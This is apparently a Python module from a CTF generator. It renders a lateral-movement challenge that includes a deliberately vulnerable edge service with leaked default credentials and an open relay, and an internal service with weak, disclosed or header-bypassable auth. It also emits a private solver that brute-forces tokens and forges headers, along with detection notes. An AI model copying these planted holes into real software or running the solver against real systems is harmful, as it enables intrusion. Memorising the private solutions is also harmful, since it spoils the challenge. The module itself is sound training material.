"""Renderer for the ``network_lateral_pivot`` family.

Theme: an internet-facing "edge" management service ships with a default
administrative account and a built-in diagnostics/relay feature. The
solver's task is to discover the default credentials, authenticate to the
edge service, use its diagnostics endpoint to learn how to reach an
internal-only service that is not reachable from outside the Docker network,
then pivot through the edge service's relay endpoint to read the flag. This
mirrors real-world "exposed service with default creds enabling lateral
movement" advisories (e.g. management interfaces shipped with unrotated
default credentials that grant a foothold into an otherwise-segmented
internal network).

AI-resistance (Front C): the *foothold* is constant, but the internal
service's authorization weakness -- the final stage of the pivot -- varies
per instance across three genuinely different vulnerability classes, each
requiring a different technique:

  - ``disclosed_token``: the diagnostics view discloses the internal access
    token outright; you harvest it and replay it.
  - ``weak_token``: the diagnostics view redacts the token, but the token is
    a well-known default from a small maintenance wordlist; you must
    dictionary-attack it through the relay.
  - ``relay_trust``: the token is a full random secret and is never
    disclosed, but the internal service over-trusts relayed requests that
    carry the asset's trust-context header; you must forge that header
    instead of ever learning the token.

A writeup for one class fails on the others (see ``private/solution.md``),
but the shipped private solver is adaptive and solves any instance. The
edge service and relay primitive are byte-for-byte class-independent; only
the internal service, the diagnostics disclosure, the hints, and the solve
narrative change.

Pure module: ``render`` is a deterministic function of ``(spec, rng,
cve_record)``. Per the project's module-interface contract this file must
NOT import ``ctf_generator.families`` (that module imports this one).
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass
from typing import TYPE_CHECKING

from ctf_generator.models import ChallengeSpec
from ctf_generator.yaml_writer import dump_yaml

if TYPE_CHECKING:
    from ctf_generator.cve_source import CveRecord

# --- Module interface contract -------------------------------------------------

FAMILY_NAME = "network_lateral_pivot"
CATEGORY = "network"
MODES: tuple[str, ...] = ("red", "purple")
DIFFICULTIES: tuple[str, ...] = ("easy", "medium", "hard")
CVE_DRIVEN = True
LLM_BRIEF = (
    "A jump-host edge service with default administrative credentials exposes a "
    "diagnostics/relay feature that lets an attacker pivot laterally to an "
    "internal-only host and read a flag reachable only from inside the network "
    "segment. The internal service's authorization weakness varies per instance "
    "(a disclosed token, a weak default token, or an over-trusted relay-context "
    "header), so the final technique differs across generated challenges. Purple "
    "mode additionally requires identifying the three-event login/diagnostics/"
    "relay detection signature and submitting a short incident narrative to "
    "satisfy an extra detection-writeup checkpoint."
)
COMPOSE_MARKERS: tuple[str, ...] = ("edge:", "internal:")
SCORING_HINTS: dict[str, object] = {
    "has_worker": False,
    "has_queue": False,
    "live_interaction": True,
    "decoy_density": "medium",
}
REQUIRED_FILES: tuple[str, ...] = (
    "challenge.yaml",
    "docker-compose.yml",
    "services/edge/Dockerfile",
    "services/edge/requirements.txt",
    "services/edge/app.py",
    "services/internal/Dockerfile",
    "services/internal/requirements.txt",
    "services/internal/app.py",
    "public/description.md",
    "public/hints.yaml",
    "private/solution.md",
    "private/solver.py",
    "private/variant.json",
    "private/checkpoints.yaml",
    "private/detection_notes.md",
    "tests/healthcheck.py",
    "tests/validate_variant.py",
)

# --- Front C: per-instance internal-auth vulnerability classes ------------------

VULN_CLASSES: tuple[str, ...] = ("disclosed_token", "weak_token", "relay_trust")

# A small wordlist of well-known default tokens for the ``weak_token`` class.
# The internal token is drawn from this list, the diagnostics view refuses to
# disclose it, and the solver must dictionary-attack it through the relay.
_WEAK_TOKENS: tuple[str, ...] = (
    "changeme",
    "default",
    "service",
    "internal",
    "admin123",
    "letmein",
    "password1",
    "maintenance",
    "temp-token",
    "backup01",
    "rotate-me",
    "operator",
    "fieldsvc-1",
    "diag-token",
)


@dataclass(frozen=True)
class Variant:
    vuln_class: str
    edge_user: str
    edge_password: str
    login_route: str
    ops_route: str
    diag_route: str
    relay_route: str
    internal_port: int
    internal_token: str
    asset_tag: str
    ops_note_id: str
    flag: str


def render(
    spec: ChallengeSpec,
    rng: random.Random,
    cve_record: "CveRecord | None" = None,
) -> dict[str, str]:
    variant = _variant(rng)

    files: dict[str, str] = {
        "docker-compose.yml": _compose(variant),
        "services/edge/Dockerfile": _python_dockerfile("app.py"),
        "services/edge/requirements.txt": "flask==3.0.3\n",
        "services/edge/app.py": _edge_app(variant),
        "services/internal/Dockerfile": _python_dockerfile("app.py"),
        "services/internal/requirements.txt": "flask==3.0.3\n",
        "services/internal/app.py": _internal_app(variant),
        "public/description.md": _description(spec, variant, cve_record),
        "public/hints.yaml": dump_yaml({"hints": _public_hints(variant)}),
        "private/solution.md": _solution(spec, variant),
        "private/solver.py": _solver(variant),
        "private/variant.json": _variant_json(spec, variant),
        "private/checkpoints.yaml": dump_yaml({"checkpoints": _checkpoint_entries(spec)}),
        "private/detection_notes.md": _detection_notes(spec, variant),
        "tests/healthcheck.py": _healthcheck(),
        "tests/validate_variant.py": _validate_variant(variant),
    }
    return files


# --- Variant generation ---------------------------------------------------------


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _variant(rng: random.Random) -> Variant:
    # Draw the vulnerability class FIRST so it is stable and seed-derived, and
    # so downstream token generation can depend on it (a weak-token instance
    # ships a wordlist default; the others ship a full random secret).
    vuln_class = rng.choice(VULN_CLASSES)

    edge_user = rng.choice(["ops-admin", "netadmin", "fieldsvc", "diagadmin"])
    edge_password = (
        f"{rng.choice(['changeme', 'rotate-me', 'default', 'temp-pass'])}-"
        f"{rng.randrange(1000, 9999)}"
    )
    login_route = rng.choice(["login", "session", "auth"])
    ops_route = rng.choice(["ops-notes", "bulletins", "field-notes", "advisories"])
    diag_route = rng.choice(["diag/hosts", "topology", "asset-map", "net-map"])
    relay_route = rng.choice(["relay", "proxy", "tunnel", "bridge"])
    internal_port = rng.choice([8091, 9090, 9443, 7070])
    if vuln_class == "weak_token":
        internal_token = rng.choice(_WEAK_TOKENS)
    else:
        internal_token = _token_hex(rng, 8)
    asset_tag = f"core-{rng.choice(['ledger', 'billing', 'inventory', 'ops'])}-{rng.randrange(10, 99)}"
    ops_note_id = f"note-{rng.randrange(100, 999)}"
    flag = f"ctf{{lateral_pivot_{_token_hex(rng, 6)}}}"
    return Variant(
        vuln_class=vuln_class,
        edge_user=edge_user,
        edge_password=edge_password,
        login_route=login_route,
        ops_route=ops_route,
        diag_route=diag_route,
        relay_route=relay_route,
        internal_port=internal_port,
        internal_token=internal_token,
        asset_tag=asset_tag,
        ops_note_id=ops_note_id,
        flag=flag,
    )


def _public_hints(v: Variant) -> list[dict[str, object]]:
    """Class-aware hints. Every instance's hints point at its own bug; the
    private solver stays adaptive so it still solves any sibling."""
    stage3: str
    if v.vuln_class == "disclosed_token":
        stage3 = (
            f"/api/{v.relay_route} lets the edge host make requests on your "
            "behalf. The diagnostics view already handed you the internal "
            "access token -- replay it through the relay."
        )
    elif v.vuln_class == "weak_token":
        stage3 = (
            f"/api/{v.relay_route} lets the edge host make requests on your "
            "behalf. The diagnostics view won't print the internal token, but "
            "it admits the token is a stock default -- try the usual "
            "maintenance defaults through the relay."
        )
    else:  # relay_trust
        stage3 = (
            f"/api/{v.relay_route} lets the edge host make requests on your "
            "behalf. You never learn the internal token -- but the internal "
            "service trusts the asset's relay-context header. Forge it."
        )
    return [
        {
            "level": 1,
            "text": (
                f"GET /api/{v.ops_route} is unauthenticated -- operational "
                "bulletins sometimes say more than they should."
            ),
        },
        {
            "level": 2,
            "text": (
                f"Once logged in, /api/{v.diag_route} is only meant for "
                "admins auditing the network topology. What does it reveal about "
                "hosts you can't reach directly?"
            ),
        },
        {"level": 3, "text": stage3},
    ]


def _checkpoint_entries(spec: ChallengeSpec) -> list[dict[str, object]]:
    """Build the checkpoint list for ``private/checkpoints.yaml``.

    Red mode emits exactly the spec-declared checkpoints (unchanged from
    prior behavior). Purple mode is a hybrid exploit-plus-detection
    challenge, so it additionally requires a detection/incident-response
    deliverable: a ``detection-writeup-submitted`` checkpoint on top of the
    spec-declared ones.
    """
    entries: list[dict[str, object]] = [
        {"name": name, "required": True} for name in spec.checkpoints
    ]
    if spec.mode == "purple":
        entries.append({"name": "detection-writeup-submitted", "required": True})
    return entries


# --- docker-compose.yml ---------------------------------------------------------


def _compose(v: Variant) -> str:
    return f"""services:
  internal:
    build: ./services/internal
    environment:
      CTFGEN_FLAG: ${{CTFGEN_FLAG:-{v.flag}}}
      INTERNAL_TOKEN: ${{INTERNAL_TOKEN:-{v.internal_token}}}
      INTERNAL_PORT: "{v.internal_port}"
      ASSET_TAG: {v.asset_tag}
    expose:
      - "{v.internal_port}"
    networks: [backend]
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 128m
    pids_limit: 64

  edge:
    build: ./services/edge
    environment:
      EDGE_USER: ${{EDGE_USER:-{v.edge_user}}}
      EDGE_PASSWORD: ${{EDGE_PASSWORD:-{v.edge_password}}}
      INTERNAL_HOST: internal
      INTERNAL_PORT: "{v.internal_port}"
      INTERNAL_TOKEN: ${{INTERNAL_TOKEN:-{v.internal_token}}}
      ASSET_TAG: {v.asset_tag}
    ports:
      - "8080:8080"
    depends_on: [internal]
    networks:
      - frontend
      - backend
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

networks:
  frontend:
  backend:
    internal: true
"""


def _python_dockerfile(entrypoint: str) -> str:
    return f"""FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY {entrypoint} .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
CMD ["python", "{entrypoint}"]
"""


# --- services/edge/app.py --------------------------------------------------------
#
# The edge service is byte-for-byte class-independent. Its relay always
# forwards a caller-supplied ``X-Internal-Token`` (from ``token``) and, when
# provided, a caller-supplied ``X-Relay-Context`` (from ``context``). Whether
# either of those is enough to read the flag is decided entirely by the
# internal service, which is what varies per class.


def _edge_app(v: Variant) -> str:
    return f'''from __future__ import annotations

import json
import os
import secrets
from urllib import request as urlrequest
from urllib.error import HTTPError, URLError

from flask import Flask, jsonify, request

app = Flask(__name__)

EDGE_USER = os.environ.get("EDGE_USER", "{v.edge_user}")
EDGE_PASSWORD = os.environ.get("EDGE_PASSWORD", "{v.edge_password}")
INTERNAL_HOST = os.environ.get("INTERNAL_HOST", "internal")
INTERNAL_PORT = os.environ.get("INTERNAL_PORT", "{v.internal_port}")
INTERNAL_TOKEN = os.environ.get("INTERNAL_TOKEN", "{v.internal_token}")
ASSET_TAG = os.environ.get("ASSET_TAG", "{v.asset_tag}")

# In-memory admin sessions issued by /api/{v.login_route}. Reset on restart --
# fine for a single-run challenge instance.
SESSIONS: dict[str, str] = {{}}


def current_admin():
    token = request.headers.get("X-Session", "")
    return SESSIONS.get(token)


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "edge"}}


@app.get("/api/{v.ops_route}")
def ops_notes():
    # Intentional vulnerability: this "public bulletins" feed leaks the
    # default administrative credentials that were never rotated after
    # provisioning. This foothold is identical across every instance.
    return jsonify({{
        "notices": [
            {{
                "id": "{v.ops_note_id}",
                "severity": "low",
                "message": (
                    "Diagnostics account credentials remain at their "
                    "provisioning defaults pending the MFA rollout: "
                    "user={v.edge_user} password={v.edge_password}"
                ),
            }},
            {{
                "id": "note-relay-hardening",
                "severity": "info",
                "message": (
                    "Reminder: the /api/{v.relay_route} diagnostics relay "
                    "should only be used against asset {v.asset_tag}."
                ),
            }},
            {{
                "id": "note-scanner",
                "severity": "info",
                "message": "Perimeter scanner findings against /debug/vars were remediated last quarter.",
            }},
        ]
    }})


@app.post("/api/{v.login_route}")
def login():
    body = request.get_json(force=True, silent=True) or {{}}
    username = str(body.get("username", ""))
    password = str(body.get("password", ""))
    if username != EDGE_USER or password != EDGE_PASSWORD:
        return jsonify({{"error": "invalid credentials"}}), 401
    token = secrets.token_hex(16)
    SESSIONS[token] = username
    return jsonify({{"token": token}})


@app.get("/api/{v.diag_route}")
def diag_hosts():
    if current_admin() is None:
        return jsonify({{"error": "authentication required"}}), 403
    # Intentional vulnerability: an admin-only diagnostics view discloses how
    # to reach the internal service. HOW MUCH it discloses is what varies per
    # instance -- exactly the disclosed token, or only the hint that the token
    # is a stock default, or only that the internal host trusts a relay-context
    # header. This is populated by the internal service's own /internal/advice.
    host = {{
        "asset_tag": ASSET_TAG,
        "address": f"{{INTERNAL_HOST}}:{{INTERNAL_PORT}}",
        "reachable_from_edge": True,
        "reachable_from_internet": False,
        "auth_header": "X-Internal-Token",
    }}
    try:
        advice_url = f"http://{{INTERNAL_HOST}}:{{INTERNAL_PORT}}/internal/advice"
        with urlrequest.urlopen(advice_url, timeout=5) as response:
            advice = json.loads(response.read().decode("utf-8"))
        host["auth_token"] = advice.get("auth_token")
        host["auth_note"] = advice.get("auth_note")
    except (HTTPError, URLError, json.JSONDecodeError):
        host["auth_token"] = None
        host["auth_note"] = "internal diagnostics advice unavailable"
    return jsonify({{"hosts": [host], "relay_route": "/api/{v.relay_route}"}})


@app.get("/api/{v.relay_route}")
def relay():
    if current_admin() is None:
        return jsonify({{"error": "authentication required"}}), 403
    target = request.args.get("target", f"{{INTERNAL_HOST}}:{{INTERNAL_PORT}}")
    path = request.args.get("path", "/internal/status")
    token = request.args.get("token", "")
    context = request.args.get("context", "")
    if not path.startswith("/"):
        return jsonify({{"error": "path must be absolute"}}), 400

    url = f"http://{{target}}{{path}}"
    headers = {{"X-Internal-Token": token}}
    if context:
        headers["X-Relay-Context"] = context
    req = urlrequest.Request(url, headers=headers)
    try:
        with urlrequest.urlopen(req, timeout=5) as response:
            body = response.read().decode("utf-8")
            status = response.status
    except HTTPError as exc:
        body = exc.read().decode("utf-8") if exc.fp else ""
        status = exc.code
    except URLError as exc:
        return jsonify({{"error": f"relay failed: {{exc.reason}}"}}), 502

    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        parsed = body
    return jsonify({{"status": status, "body": parsed}})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
'''


# --- services/internal/app.py -----------------------------------------------------
#
# The internal service is where the per-instance vulnerability class lives. Its
# /internal/advice endpoint (consumed by the edge diagnostics view) discloses
# only as much as the class permits, and /internal/flag enforces the
# class-specific authorization check.


def _internal_advice_body(v: Variant) -> str:
    if v.vuln_class == "disclosed_token":
        return (
            '{"auth_token": INTERNAL_TOKEN, '
            '"auth_note": "operator access token for X-Internal-Token"}'
        )
    if v.vuln_class == "weak_token":
        return (
            '{"auth_token": None, '
            '"auth_note": "X-Internal-Token is a legacy default from the standard '
            'maintenance wordlist -- rotate it"}'
        )
    # relay_trust
    return (
        '{"auth_token": None, '
        '"auth_note": "X-Internal-Token is a rotated secret; note the internal '
        'service also honors relayed requests carrying X-Relay-Context set to '
        'the asset tag"}'
    )


def _internal_flag_auth_check(v: Variant) -> str:
    if v.vuln_class == "relay_trust":
        return '''    supplied = request.headers.get("X-Internal-Token", "")
    context = request.headers.get("X-Relay-Context", "")
    # Broken auth-delegation: the internal service trusts the edge relay's
    # asset trust-context header as if it were proof of authorization, so a
    # forged X-Relay-Context bypasses the token entirely.
    if supplied != INTERNAL_TOKEN and context != ASSET_TAG:
        return jsonify({"error": "missing or invalid X-Internal-Token"}), 403'''
    return '''    supplied = request.headers.get("X-Internal-Token", "")
    if supplied != INTERNAL_TOKEN:
        return jsonify({"error": "missing or invalid X-Internal-Token"}), 403'''


def _internal_app(v: Variant) -> str:
    return f'''from __future__ import annotations

import os

from flask import Flask, jsonify, request

app = Flask(__name__)

FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"
INTERNAL_TOKEN = os.environ.get("INTERNAL_TOKEN") or "{v.internal_token}"
INTERNAL_PORT = int(os.environ.get("INTERNAL_PORT", "{v.internal_port}"))
ASSET_TAG = os.environ.get("ASSET_TAG") or "{v.asset_tag}"


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "internal"}}


@app.get("/internal/status")
def status():
    # Reachable without a token so a solver can confirm the pivot landed on
    # the right host, but it deliberately withholds the flag.
    return jsonify({{"service": "internal", "asset_tag": ASSET_TAG, "flag_route": "/internal/flag"}})


@app.get("/internal/advice")
def advice():
    # Consumed by the edge diagnostics view. Discloses only as much as this
    # instance's vulnerability class permits.
    return jsonify({_internal_advice_body(v)})


@app.get("/internal/flag")
def flag():
{_internal_flag_auth_check(v)}
    return jsonify({{"flag": FLAG}})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=INTERNAL_PORT)
'''


# --- public/description.md --------------------------------------------------------


def _description(spec: ChallengeSpec, v: Variant, cve_record: "CveRecord | None") -> str:
    cve_line = ""
    if cve_record is not None:
        cve_line = (
            f"\nThis challenge is themed on **{cve_record.cve_id}** "
            f"({cve_record.cvss_severity}): {cve_record.description}\n"
        )

    purple_section = ""
    if spec.mode == "purple":
        purple_section = f"""

## Blue-team deliverable

This is a **purple-team** exercise: capturing the flag is only half of it.
Once you complete the pivot above, this challenge also requires a short
written incident narrative -- submitted alongside the flag, not committed to
this repository -- naming the three-event detection signature a defender
would use to catch the attack:

1. a `POST /api/{v.login_route}` success from an unexpected source address,
2. a `GET /api/{v.diag_route}` lookup in that same admin session, and
3. a `GET /api/{v.relay_route}` request whose `target` parameter lands on
   the internal network segment.

Grading checkpoint `detection-writeup-submitted` requires this narrative.
Use `private/detection_notes.md` as the reference guidance your writeup will
be checked against.
"""

    return f"""# {spec.title}

You are assessing an internet-facing "edge" management host at
`http://localhost:8080`. Behind it, on a Docker-internal network segment you
cannot reach directly, sits an internal-only service holding the flag.
{cve_line}
## Recon

- `GET /healthz`
- `GET /api/{v.ops_route}` (no authentication required)

## Goal

Find a way onto the internal network segment and retrieve the flag from the
internal-only service. The flag format is `ctf{{...}}`.
{purple_section}
This challenge is generated as a network lateral-movement variant. The exact
route names, account name, password, internal port, and access token differ
across generated instances -- and so does *how the internal service can be
convinced to release the flag* once you have pivoted to it, so read what the
diagnostics view actually tells you rather than assuming a fixed technique.
"""


# --- private/solution.md ------------------------------------------------------------


def _internal_stage(v: Variant) -> str:
    """The class-specific paragraph + numbered final step for solution.md."""
    if v.vuln_class == "disclosed_token":
        return (
            "This instance's vulnerability class is **disclosed_token**: the "
            f"diagnostics view (`/api/{v.diag_route}`) prints the internal "
            "service's access token outright in `hosts[0].auth_token`. Harvest "
            "it and replay it through the relay.\n\n"
            f"4. `GET /api/{v.relay_route}?target=internal:{v.internal_port}"
            "&path=/internal/flag&token=<disclosed token>` with the same "
            "`X-Session` header.\n"
        )
    if v.vuln_class == "weak_token":
        return (
            "This instance's vulnerability class is **weak_token**: the "
            f"diagnostics view (`/api/{v.diag_route}`) refuses to print the "
            "internal token but admits it is a stock default from a small "
            "maintenance wordlist. Dictionary-attack it through the relay -- "
            "the relay is the oracle, returning the flag only when the token "
            "matches.\n\n"
            f"4. For each candidate default token, `GET /api/{v.relay_route}"
            f"?target=internal:{v.internal_port}&path=/internal/flag"
            "&token=<candidate>` with the `X-Session` header, until one returns "
            "the flag rather than a 403.\n"
        )
    return (
        "This instance's vulnerability class is **relay_trust**: the internal "
        "token is a rotated random secret that is never disclosed and cannot be "
        f"guessed. However, the internal service over-trusts the relay's asset "
        f"trust-context header: a request carrying `X-Relay-Context: "
        f"{v.asset_tag}` is authorized *without any token at all*. The edge "
        f"relay forwards a caller-supplied `context` parameter as that header, "
        "so you forge the trust context.\n\n"
        f"4. `GET /api/{v.relay_route}?target=internal:{v.internal_port}"
        f"&path=/internal/flag&context={v.asset_tag}` (no `token` needed) with "
        "the same `X-Session` header.\n"
    )


def _solution(spec: ChallengeSpec, v: Variant) -> str:
    purple_deliverable = ""
    if spec.mode == "purple":
        purple_deliverable = f"""

## Blue-team deliverable (grading notes)

This instance is `purple` mode, so a complete solve is graded on more than
the flag. In addition to the exploit path above, the checkpoint
`detection-writeup-submitted` requires the solver to produce a short
incident narrative naming:

1. the `POST /api/{v.login_route}` success from an unexpected source
   address,
2. the `GET /api/{v.diag_route}` lookup in that same admin session, and
3. the `GET /api/{v.relay_route}` request whose `target` parameter lands on
   the internal `backend` network segment.

This is the same three-event signature documented for defenders in
`private/detection_notes.md`. A grader should reject a submission that only
contains the flag with no reference to that sequence.
"""
    return f"""# Private Solution

The edge host's public bulletins feed (`/api/{v.ops_route}`) leaks the
default administrative credentials (`{v.edge_user}` / `{v.edge_password}`)
that were never rotated after provisioning. This foothold is identical
across every instance of this family.

Authenticated admins can call `/api/{v.diag_route}`, which discloses how to
reach the internal service. The internal service itself is only attached to
the Docker-internal `backend` network and has no published port, so it
cannot be reached directly from outside the compose network. The edge host's
`/api/{v.relay_route}` diagnostics relay, however, will forward an
authenticated admin's request to any `host:port` + path it is given,
attaching whatever `X-Internal-Token` value the caller supplies (and, if
given, an `X-Relay-Context` value). This is the pivot primitive: the edge
host itself becomes the network hop into the segmented internal service.

Foothold (identical every instance):

1. `GET /api/{v.ops_route}` and extract the leaked credentials.
2. `POST /api/{v.login_route}` with `{{"username": "{v.edge_user}", "password": "{v.edge_password}"}}` to obtain a session token.
3. `GET /api/{v.diag_route}` with header `X-Session: <token>` to learn the internal host address and how it authorizes.

Final stage (varies per instance):

{_internal_stage(v)}
5. Read the flag out of the relayed JSON body.

## Why a single writeup does not generalize

The three vulnerability classes require genuinely different final techniques,
so a writeup pinned to one class fails on the others:

- **disclosed_token** hands you the token in the diagnostics view. On a
  **weak_token** or **relay_trust** instance that field is `null`, so
  "read the token and replay it" has nothing to read.
- **weak_token** is solved by dictionary-attacking a stock default. On a
  **disclosed_token** or **relay_trust** instance the token is a full random
  secret, so the wordlist never hits.
- **relay_trust** is solved by forging `X-Relay-Context: <asset tag>` with no
  token. On a **disclosed_token** or **weak_token** instance the internal
  service ignores that header entirely, so the forged context is refused.

The shipped `private/solver.py` is adaptive: it tries the disclosed token,
then the forged relay-context, then the default-token wordlist, so it solves
any instance (and any sibling) without being told the class in advance.

This family teaches that a management host's diagnostics/relay convenience
feature is itself a lateral-movement primitive once an attacker gains a
foothold -- the specific internal-auth weakness varies per instance, but the
pivot through the edge host is the constant.{purple_deliverable}"""


# --- private/solver.py --------------------------------------------------------------


def _solver(v: Variant) -> str:
    weak_tokens = json.dumps(list(_WEAK_TOKENS))
    return f'''from __future__ import annotations

import argparse
import json
import re
import sys
from urllib import parse, request

# Well-known default tokens tried against a ``weak_token`` instance. The solver
# is adaptive: it only reaches this stage after the disclosed-token and
# forged-relay-context techniques fail, so it solves any vulnerability class.
WEAK_TOKENS = {weak_tokens}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    def get(path, headers=None):
        req = request.Request(base + path, headers=headers or {{}})
        with request.urlopen(req, timeout=5) as response:
            return response.read().decode("utf-8")

    def post_json(path, payload, headers=None):
        merged = {{"Content-Type": "application/json"}}
        merged.update(headers or {{}})
        req = request.Request(
            base + path,
            data=json.dumps(payload).encode("utf-8"),
            headers=merged,
            method="POST",
        )
        with request.urlopen(req, timeout=5) as response:
            return json.loads(response.read().decode("utf-8"))

    # Foothold (identical across all classes): harvest leaked creds, log in.
    notes = json.loads(get("/api/{v.ops_route}"))
    creds_text = " ".join(n["message"] for n in notes["notices"])
    user_match = re.search(r"user=([^\\s]+)", creds_text)
    pass_match = re.search(r"password=([^\\s]+)", creds_text)
    if not user_match or not pass_match:
        raise RuntimeError("could not find leaked credentials")
    username, password = user_match.group(1), pass_match.group(1)

    session = post_json("/api/{v.login_route}", {{"username": username, "password": password}})
    token = session["token"]
    session_headers = {{"X-Session": token}}

    diag = json.loads(get("/api/{v.diag_route}", headers=session_headers))
    host = diag["hosts"][0]
    target = host["address"]
    asset_tag = host.get("asset_tag", "")

    def relay(token_value="", context=""):
        query = {{"target": target, "path": "/internal/flag"}}
        if token_value:
            query["token"] = token_value
        if context:
            query["context"] = context
        path = "/api/{v.relay_route}?" + parse.urlencode(query)
        relayed = json.loads(get(path, headers=session_headers))
        body = relayed.get("body")
        if isinstance(body, dict) and "flag" in body:
            return body["flag"]
        return None

    # Technique 1: disclosed_token -- the diagnostics view printed the token.
    disclosed = host.get("auth_token")
    if disclosed:
        flag = relay(token_value=disclosed)
        if flag:
            print(flag)
            return 0

    # Technique 2: relay_trust -- forge the asset trust-context header, no token.
    if asset_tag:
        flag = relay(context=asset_tag)
        if flag:
            print(flag)
            return 0

    # Technique 3: weak_token -- dictionary-attack the default token.
    for candidate in WEAK_TOKENS:
        flag = relay(token_value=candidate)
        if flag:
            print(flag)
            return 0

    raise RuntimeError("no known technique recovered the flag")


if __name__ == "__main__":
    sys.exit(main())
'''


# --- private/variant.json -----------------------------------------------------------


def _variant_json(spec: ChallengeSpec, v: Variant) -> str:
    return json.dumps(
        {
            "meta": spec.meta_mapping(),
            "family": FAMILY_NAME,
            "mode": spec.mode,
            "vuln_class": v.vuln_class,
            "flag": v.flag,
            "routes": {
                "login": f"/api/{v.login_route}",
                "ops_notes": f"/api/{v.ops_route}",
                "diag_hosts": f"/api/{v.diag_route}",
                "relay": f"/api/{v.relay_route}",
            },
            "creds": {
                "edge_user": v.edge_user,
                "edge_password": v.edge_password,
                "internal_token": v.internal_token,
            },
            "network": {
                "internal_host": "internal",
                "internal_port": v.internal_port,
                "asset_tag": v.asset_tag,
            },
        },
        indent=2,
        sort_keys=True,
    ) + "\n"


# --- private/detection_notes.md ------------------------------------------------------


def _detection_notes(spec: ChallengeSpec, v: Variant) -> str:
    if spec.mode == "purple":
        depth = f"""
## Blue-team detection guidance

A defender monitoring edge host logs should alert on the combination of:

1. A successful `POST /api/{v.login_route}` from an unexpected source
   address, immediately followed by
2. A `GET /api/{v.diag_route}` call from the same session (this endpoint is
   rarely used outside scheduled audits), and
3. An outbound `/api/{v.relay_route}` request whose `target` parameter
   points at the internal `backend` network segment.

That three-step sequence -- authenticate, enumerate internal topology, then
relay into the segment -- is the signature of this lateral-movement chain
regardless of which specific credentials, route names, or internal-auth
weakness a given instance uses. Recommend: rotate the default `{v.edge_user}`
credential, rate-limit `/api/{v.diag_route}`, and restrict
`/api/{v.relay_route}` targets to an allowlist.

### Grading this instance's `detection-writeup-submitted` checkpoint

Accept a solver's writeup if it names all three events above (the
`/api/{v.login_route}` auth, the `/api/{v.diag_route}` lookup, and the
`/api/{v.relay_route}` call targeting the internal segment) in the correct
order. A submission containing only the flag, with no reference to this
sequence, does not satisfy the checkpoint.
"""
    else:
        depth = f"""
## Notes for future detection work

This instance was generated in `{spec.mode}` mode, so no blue-team
checkpoints are scored, but the same log signature applies: watch for
`/api/{v.login_route}` successes followed by `/api/{v.diag_route}` and
`/api/{v.relay_route}` calls in the same admin session.
"""
    return f"""# Detection Notes
{depth}"""


# --- tests/healthcheck.py -----------------------------------------------------------


def _healthcheck() -> str:
    return '''from __future__ import annotations

import argparse
import json
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()
    with request.urlopen(args.base_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


# --- tests/validate_variant.py -------------------------------------------------------


def _validate_variant(v: Variant) -> str:
    return f'''from __future__ import annotations

from pathlib import Path


def test_variant_tokens_are_present():
    edge_app = Path("services/edge/app.py").read_text(encoding="utf-8")
    internal_app = Path("services/internal/app.py").read_text(encoding="utf-8")
    assert "{v.edge_user}" in edge_app
    assert "{v.edge_password}" in edge_app
    assert "{v.internal_token}" in internal_app
    assert "/api/{v.relay_route}" in edge_app
'''
